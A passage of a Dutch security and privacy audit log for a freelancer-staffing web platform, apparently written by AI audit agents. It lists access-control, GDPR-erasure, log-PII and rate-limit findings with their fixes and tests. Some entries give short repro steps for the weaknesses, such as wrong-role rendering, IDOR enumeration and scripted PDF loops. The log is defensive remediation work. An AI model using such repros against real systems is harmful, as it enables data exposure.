  aanroepers (`verplichtingen/page.tsx` redirect + de Administratie-hub `tabsForRole`-allowlist). Beide
  gate'n vandaag correct (niet live-exploiteerbaar), maar een herbruikbaar component dat CLIENT-
  financiën laadt hoort de rol zélf te gaten: een toekomstige derde aanroeper — of een regressie in de
  hub-allowlist — zou de data anders onder de verkeerde "wie moet ik betalen"-lens renderen. Dit
  schendt CLAUDE.md regel 1 (server-side is de waarheid; geen client-/aanroeper-afhankelijke gating van
  kritieke status) en de eigen "route + page + action"-defense-in-depth-filosofie van het project.
  Repro: render `<VerplichtingenPanel actor={freelancerActor} />` rechtstreeks → vóór de fix haalt het
  `getObligationItemsForClient` op i.p.v. niets te tonen. Gefixt: `if (actor.role !== "CLIENT") return
  null;` vóór élke data-toegang. Test: `verplichtingen-panel.test.tsx` (FREELANCER/ADMIN → `null` én
  géén data-load; CLIENT → rendert; vooraf-geladen items → geen extra query — rood→groen bewezen:
  2 cases falen zonder de gate).

### GEPARKEERD in deze ronde

- **[LAAG · AVG art. 5/30 + CLAUDE.md regel 5 — eigen-data CSV-exports zonder audit-entry]** De vier
  self-scoped CSV-export-routes (`verplichtingen/export`, `prognose/export`, `prestaties/export`,
  `diensten/export`) doen auth→rol→rate-limit→eigen-data-query→CSV maar loggen geen `audit()`. Een
  bulk-export van eigen financiële/crediteuren-data (namen tegenpartij, bedragen, vervaldata) valt
  onder dezelfde traceerbaarheids-intentie als "documenttoegang" (regel 5) + AVG art. 30. Géén
  cross-party-data, geen security-gat; bestaande platform-brede conventie (niet nieuw geïntroduceerd).
  Aanbevolen: lichte `EXPORT_DOWNLOADED`-audit-entry op deze routes (wie exporteerde wat, wanneer)
  voor DPO-/admin-onderzoek. Bewust geparkeerd: audit op élk zelf-export kan ruis geven — eerst
  DPO-afweging of dit gewenst/consistent-over-álle-exports moet.
- **[LAAG · OWASP A01 — `pushSubscription.upsert` keyt alleen op `endpoint` (niet ook `userId`)]**
  `api/push/subscribe/route.ts` upsert op `endpoint` alleen; wie een slachtoffer-endpoint (een
  cryptografisch willekeurige, per-browser, niet-raadbare bearer-URL) al bezit, kan de rij naar zich
  toe herbinden en toekomstige push-levering aan dat toestel blokkeren. Vereist voorkennis van het
  geheim → niet-praktisch; code-comment erkent en accepteert dit al. Aanbevolen (alleen bij strenger
  dreigingsmodel): compound-key `[endpoint,userId]` of ownership-check vóór herbinden.
- **[LAAG · CLAUDE.md regel 5 — niet-atomaire audit-writes in enkele franchise-actions]** In o.a.
  `franchise/diensten/actions.ts:setDienstStatus` en `franchise/opdrachtgevers/actions.ts:createOpdracht
gever` staan de Prisma-mutatie en de daaropvolgende `audit()` als twee losse statements i.p.v. één
  `$transaction`; sterft het proces ertussen dan bestaat de mutatie zonder audit-record. Platform-brede
  bestaande conventie (niet franchise-specifiek), waarschijnlijk geaccepteerde trade-off. Aanbevolen:
  state-wijzigende write + `auditData()` in `prisma.$transaction([...])` wikkelen (zoals `setLeadStatus`/
  `addLeadContact` al doen).

## Ronde 2026-07-05 (basis: `main` @ 201b321)

Audit: orchestrator (Opus 4.8) + 3 parallelle Opus security/privacy-subagents op niet-overlappende
oppervlakken — (1) cross-tenant/IDOR over ÁLLE franchise-server-actions + tenant-scoped reads,
(2) AVG art. 17/15/20 erasure-/export-volledigheid van `anonymizeUser` vs. het volledige schema,
(3) CSV-/formule-injectie in exports + authz/cross-party-PII/rate-limit op alle PDF-/dossier-/export-
endpoints. Kader: OWASP Top 10 (A01 broken access control, A04 insecure design, A09 logging) +
AVG art. 5/15/17/30. Zelf geverifieerd: crown-jewel-endpoints (`/api/documents/[id]` ownership+audit+
CSP-sandbox, `/api/media/[...key]` logoKey-scope), cron-auth (timing-safe Bearer), billing-webhook
(Mollie re-fetch-patroon: `id` is niet trust-bearing), CSP (nonce + strict-dynamic, `object-src none`,
`frame-ancestors none`), rate-limiters (login/register/reset/credential-verify/upload/export/pdf/dossier),
ICS-builder (`escapeIcsText` op SUMMARY/DESCRIPTION/LOCATION → geen iCal-injectie), credential-zelf-
verificatie (DUO/BIG: auth→rol→rate-limit→ownership→type-guard). `npm audit`: 0 prod-kwetsbaarheden.
**Cross-tenant/IDOR: geen nieuwe gaten** (tenantId nooit uit client-input; elke duale mutatie scopet
béide resources). **CSV/PDF-authz: geen nieuwe gaten** (`escapeCsvField` neutraliseert `= + @ TAB CR`

- niet-numerieke `-`; elke PDF-route ownership+audit+rate-limit). Eén privacy-bevinding gefixt
  (rood→groen); rest geparkeerd.

### OPGELOST in deze ronde

- **[HOOG→OPGELOST · AVG art. 17 (recht op vergetelheid) — `SupportTicket.subject` overleefde de
  anonimisering onversluierd]** `anonymizeUser` (`admin/gebruikers/actions.ts`) redacteerde wél de
  `SupportMessage.body` van de betrokkene maar niet het **onderwerp** van diens eigen supporttickets.
  `SupportTicket.subject` is niet-nullable vrije tekst die de gebruiker zélf typt bij het openen van
  een ticket (kan naam/adres/telefoon/documentdetail bevatten) en wordt bewijsbaar als persoonsgegeven
  behandeld — het staat in de AVG-inzage-export (`account-export.ts`). Na anonimisering bleef de ticket
  met `userId` bestaan en het onderwerp verbatim leesbaar voor elke admin → de persoon bleef herleidbaar
  uit zijn eigen woorden. `anonymize-erasure.test.ts` had géén assertie op `SupportTicket` (gemist, niet
  bewust uitgesloten — anders dan `NoShowReport`, dat een expliciete "bewust niet hier"-comment draagt).
  Repro: open een ticket met een naam/adres in het onderwerp → vraag verwijdering aan → `anonymizeUser`
  → het onderwerp staat er nog. Gefixt: `supportTicket.updateMany({ where: { userId }, data: { subject:
"[Verwijderd op verzoek van de gebruiker]" } })` in de anonimiseringstransactie (spiegelbeeld van de
  `SupportMessage.body`-redactie; veld niet-nullable → neutrale redactiestring). Geschonden: CLAUDE.md-
  verificatieflow/AVG art. 17. Test: nieuwe case in `anonymize-erasure.test.ts` (onderwerp gemaskeerd,
  gescopet op de eigen `userId` — rood→groen bewezen: faalt zonder de transactieregel).

### GEPARKEERD in deze ronde

- **[MIDDEL (escalatie MENSENWERK) · AVG art. 17 vs. bewaargrond — `NoShowReport.reason` over de
  geanonimiseerde ZZP'er]** Vrije tekst die de tégenpartij (`reportedById`) over de no-show van de
  ZZP'er schreef; de betrokkene blijft daaruit herleidbaar ná anonimisering van het eigen account.
  Bewust niet in `anonymizeUser` (comment `actions.ts` markeert de arbeidsgeschil-bewaargrond). Dit is
  een echte erasure-vs-rechtsgrond-afweging (bewaartermijn + of het ZZP'er-identificerende deel wordt
  geredigeerd terwijl het operationele feit blijft) → menselijke juridische beslissing (MENSENWERK §5),
  geen agent-fix. Aanbevolen: DPO bepaalt bewaartermijn/redactiestrategie; daarna alsnog scopen.
- **[LAAG · AVG art. 15/20 — inzage-export mist enkele eigen vrije-tekstvelden]** `buildAccountExport`
  bevat `AvailabilityWindow.note`, `ShiftHandoff.reason/decisionNote` en `LeadContact.body` niet, terwijl
  dat eigen vrije tekst van de betrokkene is die bij erasure wél wordt geredigeerd. Voor volledige art.
  15/20-pariteit toevoegen aan de export (strikte `select`, alleen de eigen rijen). Geen securityrisico.
- **[LAAG · OWASP A09/consistentie — `/api/agenda` (.ics-rooster-export) zonder rate-limit + audit]**
  De route is self-scoped (`OR: [{company.userId},{freelancer.userId}]`) en auth-gated, maar mist —
  anders dan de zusterexports (`account/export`, PDF-routes) — een `exportRateLimiter`-check en een
  audit-entry. Laag risico (alleen het eigen actieve rooster, geen extra cross-party-PII), maar voor
  consistentie met "audit alles wat telt" + defense-in-depth tegen een scripted DB-loop: voeg
  `enforceRateLimit(exportRateLimiter, ...)` + een `AGENDA_EXPORTED`-audit toe. Aanbevolen fix in
  `src/app/api/agenda/route.ts`.

## Ronde 2026-07-04b (basis: `main` @ f04d7b3)

Audit: orchestrator (Opus 4.8) + 1 parallelle Opus security-subagent op de delta sinds de vorige ronde
(`b86c33b..f04d7b3`, #599–#606). Kader: OWASP Top 10 (A01 broken access control, A09 logging) + AVG
art. 5 lid 1f. **Authz/IDOR/cross-tenant: geen nieuwe gaten** — de nieuwe bemiddelaar-voordracht
(`franchise/diensten/actions.ts` → `dienst-voordracht.ts`) is end-to-end gepoort: `requireRole(
"FRANCHISER")` → Zod → tenant-scope op **zowel** de dienst (`job.tenantId !== tenantId → "niet
gevonden"`) **als** de ZZP'er (`freelancerProfile.findFirst({ where: { id, tenantId } })`) →
engageability server-herberekend → audit → notificatie; het lees-pad `getRosterCandidatesForDienst`
her-checkt de tenant onafhankelijk. Health-probe + `global-error` lekken niets naar
niet-geauthenticeerde callers (payload hard begrensd tot `status/db/commit/time`; alleen `error.digest`
naar de UI). De nieuwe `/ontwerp`-conceptbestanden bevatten geen injectiesink (0 treffers op
`dangerouslySetInnerHTML|prisma\.|fetch\(|process\.env`), maar de route is bewust inlogvrij —
**staande waarschuwing:** nooit echte gebruikers-/documentdata in die conceptcomponenten bedraden.
Eén privacy-bevinding gefixt (rood→groen).

### OPGELOST in deze ronde

- **[MIDDEL→OPGELOST · AVG art. 5 lid 1f / OWASP A09 — rauwe PII (e-mailadres + foutobject) naar de
  hostlog in het admin-bulk-importpad]** `admin/import/actions.ts` logde bij een mislukte welkomstmail
  **`console.error("Import: welkomstmail mislukt voor", row.email, mailErr)`** — het e-mailadres stond
  als los argument (niet eens verstopt in een foutobject) plus de rauwe mailfout (die bij nodemailer/
  Resend zélf óók het adres draagt) — én bij een mislukte aanmaak `console.error(..., e)` waar een
  Prisma-unique-constraintfout het adres kan echoën. Buiten de redactie-pijplijn → onversluierd in de
  Railway-hostlogs. Dit is exact het antipatroon dat #599 (`logMailFailure`) elders dichtte, maar déze
  drie call-sites (plus vier zuster-`storage.delete(...)`-`catch`-sites in `bedrijf`/`documenten`/
  `certificaten`/`admin/gebruikers` en `reviews-reveal-task.ts`) bleven over. Extra risico: het import-
  pad verwerkt in één keer de MEESTE PII (bulk-adressen van geïmporteerde accounts). Gefixt: import-
  call-sites via `logger.error(..., { email: row.email, error: describeError(e) })` (de logger maskeert
  e-mailadressen in élke stringwaarde → `j***@firma.nl`, `describeError` reduceert tot naam/message/
  stack zodat provider-velden zoals `.rejected` niet meegaan); nieuwe gedeelde helper
  `logStorageCleanupFailure(source, storageKey, error)` (`src/lib/observability/storage-failure.ts`,
  spiegelt `logMailFailure`) op de vier storage-`catch`-sites; `reviews-reveal-task` idem. Geschonden:
  CLAUDE.md regel 5 (geen PII in log) + OWASP A09. Test: `src/lib/observability/storage-failure.test.ts`
  (adres in de storage-fout-message gemaskeerd; provider-veld `requesterEmail`/`bucketPolicy` lekt niet
  mee; niet-Error-input gooit nooit door — rood→groen).

## Ronde 2026-07-04 (basis: `main` @ b86c33b)

Audit: orchestrator (Opus 4.8) + 3 parallelle Opus security/privacy-subagents op niet-overlappende
oppervlakken — (1) object-/functieniveau-autorisatie/IDOR/cross-tenant over ÁLLE server actions +
API-routes (focus op de delta #588–#598), (2) injectie/upload/secrets/auth-sessie/headers/SSRF/CSRF,
(3) AVG-recht-op-verwijdering + inzage-export + verwerkingsregister + k-anonimiteit + PII-in-logs.
Kader: OWASP Top 10 (A01 broken access control, A04 insecure design, A05 misconfig, A09 logging) +
AVG art. 5/15/17/30/44/46. **Authz/IDOR/cross-tenant: geen nieuwe gaten** (elke recente feature —
beschikbaarheid-signalen, semantische-matching-scorecomponent, skills-picker, reactiebereidheid-
context — is puur/deterministisch of gescopet op de eigen data van de actor; `assertSameTenant`/
`tenantScopeWhere` overal aanwezig). **Injectie/upload/secrets/auth/headers/SSRF: geen nieuwe gaten**
(de nieuwe Resend HTTP-adapter praat met een hardcoded host, logt geen adres/subject, is inert zonder
`RESEND_API_KEY`; CSP-nonce, storage-traversalguard en env-gating ongewijzigd). `npm audit`: 0 prod-
kwetsbaarheden (2 dev-only low/moderate). Eén security- + één privacy-bevinding gefixt (rood→groen);
de rest geparkeerd.

### OPGELOST in deze ronde

- **[MIDDEL→OPGELOST · A09 / AVG art. 5 lid 1f — ontvangeradres (PII) lekt naar hosting-logs bij
  mislukte mailverzending]** Vijf geplande taken (`notification-digest-task`, `payment-reminders-task`,
  `vat-reminder-task`, `dba-monitor-task`, `concept-invoice-reminders-task`) plus de al eerder
  geparkeerde call-sites (`wachtwoord-vergeten/actions.ts:72,83`, `api/tasks/run-all/route.ts:70`)
  logden een mislukte `mail.send(...)` via **rauwe `console.error("… mislukt:", err)`** — buiten de
  redactie-pijplijn en buiten de auditdatabase. Een SMTP-weigering (nodemailer) draagt het adres in
  `.message`/`.response`/`.rejected`; sinds de Resend HTTP-driver (#589) draagt ook de HTTP-foutbody bij
  een validatiefout het adres. In productie belanden die objecten onversluierd in de Railway-hostlogs
  (AVG-lek). Repro: draai een reminder-taak met een mailkanaal dat een adres weigert → het volledige
  foutobject met `jan@firma.nl` staat in de hostlog. Gefixt: nieuwe `logMailFailure(source, error)`
  (`src/lib/observability/mail-failure.ts`) stuurt de fout via de bestaande `logger` (maskeert e-mail →
  `j***@firma.nl`) + `describeError` (reduceert tot naam/message/stack, provider-velden zoals `.rejected`
  gaan sowieso niet mee). Alle 8 call-sites omgezet; `run-all`/token-fout via `logger.error(…, { error:
describeError(err) })`. Geschonden: CLAUDE.md regel 5 (audit/geen PII in log) + OWASP A09. Test:
  `src/lib/observability/mail-failure.test.ts` (SMTP- én Resend-foutvorm → adres gemaskeerd, joint álle
  console-argumenten zodat een terugval op `console.error(source, err)` óók faalt; rood→groen).

- **[MIDDEL→OPGELOST (register/MENSENWERK; go-live = mensenwerk) · AVG art. 44/46 — Resend-doorgifte
  naar derde land niet transparant in het register]** Sinds `EMAIL_DRIVER=resend` (#589) gaan
  ontvangeradres/naam/notificatie-inhoud naar Resend (US-verwerker, mogelijk buiten de EER), maar de
  `notificaties-email`-entry in `processing-register.ts` noemde slechts een generieke "E-maildienst-
  verlener" zonder de doorgifte/SCC-waarborg — anders dan de Geoapify-precedent. Gefixt (transparantie):
  register-entry noemt nu expliciet de mogelijke EER-doorgifte + vereiste modelcontractbepalingen
  (SCC's)/EU-regio; MENSENWERK.md §5a kreeg een harde DPO-poort ("houd `EMAIL_DRIVER` op `noop`/`smtp`
  tot SCC's/EU-regio bevestigd"). De **feitelijke** go-live-beslissing (DPA met SCC's tekenen) blijft
  MENSENWERK — de code is inert zonder `RESEND_API_KEY`. Geschonden: AVG art. 44/46 (transparantie/
  waarborg doorgifte).

## Ronde 2026-07-03b (basis: `main` @ cabe0f0)

Audit: orchestrator (Opus 4.8) + 2 parallelle Opus security/privacy-subagents op niet-overlappende
oppervlakken — (1) IDOR/authz/cross-tenant over de nieuwste server actions (reacties/kandidaten/
samenwerkingen-cascade/franchise + de #582 `Mijn vakgebied`-filter), (2) AVG-/privacy-dekking over
ALLE `src/app/api/**`-routes, het verwerkingsregister vs. het volledige schema, k-anonimiteit en
PII-in-logs. Kader: OWASP Top 10 (A01 broken access control, A04 insecure design, A09 logging) +
AVG art. 5/15/17/30. **IDOR/cross-tenant: geen nieuwe gaten** — elke cascade-actie herleidt owner/
tenant uit een verse DB-rij op de primaire id (`collaborationId` dient alleen `revalidatePath`),
`assertSameTenant`/`tenantScopeWhere` overal aanwezig, het #582-filter is puur additief op de eigen
profielbranches achter `visibleJobsWhere`. Twee bevindingen volledig gefixt (rood→groen); de rest
geparkeerd.

### OPGELOST in deze ronde

- **[LAAG→OPGELOST · AVG art. 17 + 15/20 — FavoriteFreelancer.note]** De privé favorieten-notitie die
  een CLIENT over een ZZP'er schrijft (vrije tekst, subjectief oordeel dat de betrokkene als auteur
  identificeert) ontbrak in **zowel** `anonymizeUser` (`admin/gebruikers/actions.ts`) als de inzage-
  export (`account-export.ts`) — bevestigd al langer open (zie GEPARKEERD-items 2026-06-25b/07-03).
  `Company` wordt bij anonimisering geüpdatet (niet verwijderd), dus de `onDelete:Cascade` op
  `FavoriteFreelancer` vuurt niet → de notitie bleef verbatim en attribueerbaar staan. Gefixt:
  `favoriteFreelancer.updateMany({ where: { company: { userId } }, data: { note: null } })` in de
  anonimiseringstransactie (gescopet op de eigen bedrijven — nooit andermans notitie) + een strikt-
  `select`-query in `buildAccountExport` (`where: { company: { userId }, note: { not: null } }`, alleen
  `note`/`createdAt`, geen `freelancerProfileId` → geen identiteit van de gemarkeerde ZZP'er). Geschonden:
  CLAUDE.md-verificatieflow/AVG art. 17 + 15/20. Tests: nieuwe case in `anonymize-erasure.test.ts` +
  `account-export.test.ts` (rood→groen).

- **[MIDDEL→OPGELOST · A04 / AVG art. 5 — geen rate-limit op de modelovereenkomst-PDF]**
  `GET /api/samenwerkingen/[id]/modelovereenkomst` genereert on-demand een juridisch DBA-document met
  cross-party PII (namen, KvK-nabije jobomschrijving, DBA-indicatoren, bedrijfsnaam) — exact dezelfde
  vorm als `facturen|prestaties/[id]/pdf`, `admin/facturatie/[id]/pdf` en de `dossier|dba-dossier`-routes,
  die állen `documentPdfRateLimiter` kregen in PR #586. Déze route werd bij #586 gemist: geen enkele rem
  → een partij kan een scripted loop draaien (onbegrensde PDF-generatie + cross-party PII-join, nooit 429).
  Ownership/authz + audit waren intact — availability/defense-in-depth. Gefixt: `enforceRateLimit(
documentPdfRateLimiter, actor.id)` ná `requireActor()`, vóór de DB-query — identiek aan de zusterroutes
  (60/uur, `DOCUMENT_PDF_RATE_LIMIT`). Geschonden: OWASP A04. Test:
  `modelovereenkomst-ratelimit.test.ts` (429→geen PDF/geen audit; toestemming→200+audit; sleutel=actor.id;
  rood→groen).

### GEPARKEERD — privacy / AVG (ronde 2026-07-03b)

- **[MIDDEL · AVG art. 30 — support/helpdesk-PII ontbreekt in het verwerkingsregister]**
  `SupportTicket` (`schema.prisma`, `subject`/`category`/`priority`) en `SupportMessage` (`body`, vrije
  tekst door de gebruiker) houden PII vast met **geen** `ProcessingActivity` in `PROCESSING_REGISTER` en
  **geen** `RetentionRule` in `RETENTION_SCHEDULE` (grep: nul treffers op "support"/"ticket" in
  `processing-register.ts`). Supporttickets bevatten vaak gevoelige context (bv. een ZZP'er die een
  afgewezen VOG/diploma-verificatie betwist, of een betaalgeschil). Fix: register-entry `support-helpdesk`
  (grondslag OVEREENKOMST/GERECHTVAARDIGD_BELANG, betrokkenen ZZP'ers/opdrachtgevers, categorieën
  onderwerp/body/categorie/prioriteit, ontvangers "intern platformbeheer") + bewaartermijn (bv. opgelost +
  N maanden). **MENSENWERK**: bewaartermijn met de eigenaar bevestigen.
- **[LAAG→OPGELOST (ronde 2026-07-04b) · AVG art. 5 lid 1f — storageKey + rauwe fout naar console]**
  `bedrijf/actions.ts`, plus de zuster-call-sites `documenten`/`certificaten`/`admin/gebruikers`, logden
  bij een mislukte `storage.delete(...)` de `storageKey` + het rauwe `err`-object via `console.error`,
  buiten de redactie-pijplijn. Gefixt in ronde 2026-07-04b: alle vier via de nieuwe gedeelde helper
  `logStorageCleanupFailure(source, storageKey, error)` (`src/lib/observability/storage-failure.ts`) —
  `describeError` reduceert de fout tot naam/message/stack en de logger maskeert e-mailadressen. Zie het
  OPGELOST-item bovenaan ronde 2026-07-04b.
- **[LAAG→OPGELOST (ronde 2026-07-04, #599) · AVG art. 5 lid 1f — rauwe foutobjecten naar console]**
  `api/tasks/run-all/route.ts:70` en `wachtwoord-vergeten/actions.ts:72,83` logden een rauwe taak-/
  mailfout via `console.error`. Beide omgezet naar `logger.error(…, { error: describeError(err) })` /
  `logMailFailure` in ronde 2026-07-04 (#599, mail-fout-PII-sweep). Zie dat OPGELOST-item.

## Ronde 2026-07-03 (basis: `main` @ 90a5374)

Audit: orchestrator (Opus 4.8) + 3 parallelle Opus security/privacy-subagents op niet-overlappende
oppervlakken — (1) recente non-admin/franchise server actions (berichten/opdrachten/samenwerkingen/
kandidaten/leads + kandidaten-triage), (2) ALLE API route-handlers + upload/storage + SSRF + headers,
(3) AVG recht-op-verwijdering (`anonymizeUser`) + inzage-export vs. het volledige Prisma-schema.
Kader: OWASP Top 10 (A01 broken access control, A04 insecure design, A05 misconfig, A09 logging) +
AVG art. 5/15/17/30. De nieuwste feature — de tweezijdige double-blind beoordelingen (#579-reeks,
`reviews.ts`/`review-actions.ts`/`reviews-reveal-task.ts`) — is expliciet geverifieerd schoon: de
PENDING_REVEAL-status lekt nergens vóór de simultane onthulling (publieke profielen filteren op
`status: "PUBLISHED"`; de samenwerking-detailpagina toont een deelnemer alleen zijn eigen review +
de PUBLISHED-review van de tegenpartij; de volledige `col.reviews`-array wordt uitsluitend in de
admin-moderatietak gerenderd). Server actions & API-routes: **geen** KRITIEK/HOOG IDOR, cross-tenant-
lek, SSRF, path-traversal of ontbrekende ownership gevonden (elke mutatie herleidt ownership/tenant
uit een verse DB-rij; storage weigert traversal; de enige externe `fetch` — Geoapify — heeft een
hardcoded host). Drie AVG-art.-17-bevindingen (recht op verwijdering onvolledig) volledig gefixt
(rood→groen); de rest geparkeerd.

### OPGELOST in deze ronde

- **[HOOG · AVG art. 17 — recht op verwijdering onvolledig: Application.note]** `anonymizeUser()`
  (`admin/gebruikers/actions.ts`) redacteerde `Application.motivation` (freelancer-scoped), maar niet
  `Application.note` — de interne kandidaatnotitie die de betrokkene als CLIENT zélf schreef bij
  reacties op de eigen opdrachten (vrije tekst, mogelijk persoonlijke opmerkingen over een ZZP'er).
  Een `user.update` triggert geen cascade → bleef verbatim en herleidbaar staan. Repro: CLIENT
  schrijft een notitie bij een sollicitant → CLIENT wordt geanonimiseerd → `Application.note` blijft.
  Gefixt: `application.updateMany({ where: { job: { company: { userId } } }, data: { note: null } })`
  in de anonimiseringstransactie (gescopet op de eigen bedrijfsopdrachten — nooit andermans tekst).
  Geschonden: CLAUDE.md-verificatieflow/AVG art. 17. Test: nieuwe case in `anonymize-erasure.test.ts`.

- **[HOOG · AVG art. 17 — recht op verwijdering onvolledig: ShiftHandoff.decisionNote]** Dezelfde
  anonimisering wiste `ShiftHandoff.reason` (aanvragerskant, `requestedByUserId`), maar niet
  `decisionNote` — de verplichte afwijsreden die de betrokkene als FRANCHISER/beslisser zelf schreef
  (`decidedByUserId`), vrije tekst die de aanvrager/kandidaat kan benoemen. Gefixt:
  `shiftHandoff.updateMany({ where: { decidedByUserId: userId }, data: { decisionNote: null } })` —
  het spiegelbeeld van de bestaande reason-redactie. Test: nieuwe case (rood→groen).

- **[HOOG · AVG art. 17 — recht op verwijdering onvolledig: LeadContact.body]** `anonymizeUser`
  raakte `Lead`/`LeadContact` niet aan; de bel-/gespreksnotities die de betrokkene als FRANCHISER
  zelf schreef (`LeadContact.body`, `createdById`) bleven volledig intact en attribueerbaar. Gefixt:
  `leadContact.updateMany({ where: { createdById: userId }, data: { body: "[Verwijderd…]" } })` (veld
  is niet-nullable → neutrale redactiestring). De derde-partij-lead-PII (contactName/email/phone/
  notes) valt onder het aparte verwerkingsregister-/bewaartermijn-item, niet onder déze erasure. Test:
  nieuwe case (rood→groen).

### GEPARKEERD — privacy / AVG (ronde 2026-07-03)

- **[MIDDEL · AVG art. 17 — NoShowReport.reason bij de melder]** `NoShowReport.reason` (vrije tekst,
  `reportedById` = CLIENT of FRANCHISER — beide anonimiseerbaar) wordt bij anonimisering van de melder
  niet gewist. NB: `anonymizeUser` sluit `NoShowReport.reason` bewust uit wanneer de ZZP'er (het
  subject) wordt geanonimiseerd (mogelijke bewaargrond bij arbeidsgeschil). Voor de melderskant is
  dat een aparte DPO-afweging (eigen vrije tekst vs. bewijsbewaring). Fix na DPO-akkoord:
  `noShowReport.updateMany({ where: { reportedById: userId }, data: { reason: "[Verwijderd…]" } })`.
- **[MIDDEL · AVG art. 17 — Performance/Invoice.rejectionReason]** De afwijsreden die een partij
  (meestal CLIENT) bij een prestatie/factuur schreef blijft na anonimisering staan. Deze rijen hebben
  een eigen fiscale bewaargrond (factuur = 7 jr); alleen de _reden-tekst_ zou geredact moeten worden,
  bedragen/nummers/data behouden — spiegelt `Collaboration.cancellationReason`. Er is geen
  `rejectedById`-kolom; scope via de `actorId` op het domein-/auditevent van de afwijzing (zoals
  `disputeReason` via `DISPUTE_OPENED`). DPO-afweging. Fix in een aparte increment.
- **[OPGELOST 2026-07-08 · AVG art. 15/20 — inzage-export onvolledig (uitbreiding)]** `buildAccountExport`
  (`account-export.ts`) miste naast de eerder geparkeerde categorieën (ontvangen `Review`, eigen
  `ShiftHandoff.reason`, `AvailabilityWindow.note`, open `Collaboration.disputeReason`) ook: eigen
  `Application.note` (CLIENT), `NoShowReport` (melder), `ShiftHandoff.decisionNote` (beslisser),
  `LeadContact.body` (franchiser). **Gefixt:** 8 nieuwe strikt-`select`-secties toegevoegd, elk gescopet
  op de eigen actor en zonder derde-partij-PII — `receivedReviews` (`subjectId==actor`, **alleen
  PUBLISHED** zodat de double-blind reveal niet vóór onthulling wordt gebroken; geen authorId),
  `clientApplicationNotes` (`job.company.userId==actor`, alleen `note`), `shiftHandoffRequests`
  (`requestedByUserId`, alleen `reason`), `shiftHandoffDecisions` (`decidedByUserId`, alleen
  `decisionNote`), `availabilityNotes` (eigen profiel), `noShowReports` (`reportedById`, geen
  `verdictNote`/ZZP-identiteit), `leadContacts` (`createdById`, alleen eigen `body`) en
  `openDisputeReasons` (gescopet op de eigen `DISPUTE_OPENED`-events, net als `anonymizeUser`). De
  derde-partij-lead-PII (contactName/email/phone) blijft onder het aparte verwerkingsregister-item. 8
  nieuwe tests (rood→groen). Geen schemawijziging.
- **[OPGELOST 2026-07-03b · AVG art. 15/20 + 17]** `FavoriteFreelancer.note` (privé CLIENT-notitie)
  ontbrak in zowel `anonymizeUser` als de export. Gefixt (zie ronde 2026-07-03b): `updateMany({ note:
null })` in de anonimiseringstransactie + strikt-`select`-export-query.

### GEPARKEERD — security / hardening (ronde 2026-07-03)

- **[OPGELOST 2026-07-03 · MIDDEL · A04 — geen rate-limit op financiële/PDF-exports]** `exportRateLimiter`
  was alléén op `/api/account/export` bedraad; de CSV-/PDF-/dossier-routes deden DB-joins + on-demand
  generatie zónder per-gebruiker-rem (`admin/export/invoices` dumpt ÁLLE platformfacturen met
  tegenpartij-PII per call — grootste amplificatie). Ownership/authz was intact — availability/
  defense-in-depth. Gefixt via een gedeelde `enforceRateLimit`-guard (`lib/rate-limit-guard.ts`,
  429 + `Retry-After`): de bulk CSV/JSON-exports (`admin/export/invoices`, `administratie/{export,btw,
openstaand}`, `diensten|prestaties|prognose|verplichtingen/export`, `admin/{audit,avg}/export`) op
  `exportRateLimiter` (5/uur, per-route-key tegen kruis-starvatie), en de per-document PDF/dossier-routes
  (`facturen/[id]/pdf`, `prestaties/[id]/pdf`, `admin/facturatie/[id]/pdf`,
  `samenwerkingen/[id]/{dossier,dba-dossier}`) op een nieuwe `documentPdfRateLimiter` (60/uur, env
  `DOCUMENT_PDF_RATE_LIMIT`). Check zit ná auth, vóór DB/generatie; `account/export` hergebruikt nu
  dezelfde helper. Tests: `rate-limit-guard.test.ts` + `admin/export/invoices/route.test.ts`. PR #586.
- **[OPGELOST 2026-07-17 · LAAG · CLAUDE.md regel 6 — Zod-grens]** `saveApplicationNote`
  (`kandidaten/actions.ts`) begrensde `note` met een handmatige `.slice(0, 2000)`. Nu via de gedeelde
  `boundReason` (`src/lib/text-bounds.ts`) — consistent met de A04-hardening (PR #803).

## Ronde 2026-06-25b (basis: `main` @ d1116a1)

Audit: orchestrator (Opus 4.8) + 4 parallelle Opus security/privacy-subagents op niet-overlappende
oppervlakken — (1) API route-handlers, (2) franchise-/admin-tenant-isolatie, (3) non-admin server
actions, (4) AVG/anonimisering + dataminimalisatie. Kader: OWASP Top 10 (A01 broken access control,
A04 insecure design, A05 misconfig, A07 auth, A09 logging) + AVG art. 5/15/17/30. Focus op de nieuwste
features (#540 presigned S3-URLs, #541 reactie-pijplijn, #543 kandidaten-vergelijking, #545
wachttijd-signaal, #546 publieke betaal-webhook). Drie bevindingen volledig gefixt (rood→groen); de
rest geverifieerd en hieronder geparkeerd.

**Expliciet geverifieerd schoon:** tenant-isolatie over ALLE franchise-/admin-actions en -pagina's
(elke mutatie volgt auth→rol→`assertSameTenant`/`tenantScopeWhere`→Zod→actie→audit; geen cross-tenant
lees-/schrijfpad voor een FRANCHISER; geen privilege-escalatie FRANCHISER→ADMIN). De presigned
S3-download-URL (#540) wordt alléén voor logo's gebruikt (niet-gevoelig, `requireActor`+bekende
`logoKey` vóór de redirect) — geen gevoelig document gaat via presigning langs de audit. De nieuwe
pijplijn-/vergelijk-/wachttijd-modules zijn puur en deterministisch; de `/kandidaten/vergelijk`-pagina
heeft een harde ownership-poort (`company: { userId: actor.id }`). De publieke betaal-webhook (#546)
vertrouwt de body nooit en herhaalt de status autoritatief bij de provider.

### OPGELOST in deze ronde

- **[MIDDEL · A09 / AVG art. 30 — auditplicht geweigerde inzage]** `GET /api/samenwerkingen/[id]/dossier`
  en `/dba-dossier` serveren een cross-party compliance-/DBA-dossier (PII: namen, KvK/BTW,
  certificaatstatus) en logden wél de geslaagde export, maar NIET de geweigerde inzage — anders dan
  `/api/documents/[id]` (`DOCUMENT_ACCESS_DENIED`). Daardoor was IDOR-enumeratie op collaboration-id's
  onzichtbaar in het auditspoor. Repro: niet-partij doet `GET …/dossier` met een gegokt id → 403,
  geen auditregel. Gefixt: `DOSSIER_ACCESS_DENIED` / `DBA_DOSSIER_ACCESS_DENIED`-audit (met IP/UA via
  `requestMeta`) op het 403-pad + IP/UA op de bestaande export-audits; NL-labels in `audit-labels.ts`.
  Geschonden: CLAUDE.md regel 5. Test: `src/app/api/dossier-routes-audit.test.ts` (4 cases,
  geautoriseerd→export-audit; niet-partij→403 + denied-audit, geen serve; rood→groen).

- **[HOOG · AVG art. 17 — recht op verwijdering onvolledig: AvailabilityWindow.note]** `anonymizeUser()`
  (`admin/gebruikers/actions.ts`) updatet `FreelancerProfile` (niet verwijderen), dus de `onDelete:
